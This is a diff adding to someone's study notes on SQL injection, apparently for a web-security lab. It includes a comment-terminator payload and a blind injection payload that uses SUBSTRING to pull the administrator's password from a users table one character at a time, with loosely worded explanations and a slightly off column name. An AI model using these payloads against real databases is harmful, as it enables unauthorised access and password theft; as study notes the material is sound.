@@ -37,3 +37,12 @@ List table with : `SELECT table_name`, or Select columns of table with `column_n
 UNION Attack not work always here
 
 `' AND '1'='1#` the end `'` added by sql himself during query construction is after  `#` break a command same thing for `--`
+
+### For SUBSTRING / SUBSTR 
+`SUBSTRING (colum_name, 3, 10)` is a third in 10 char strings
+So (2, 1) is second char in 1
+`' AND (SELECT SUBSTRING (password, 3, 1) FROM users WHERE users = 'administrator') = 'a`
+
+### Error Based
+
+
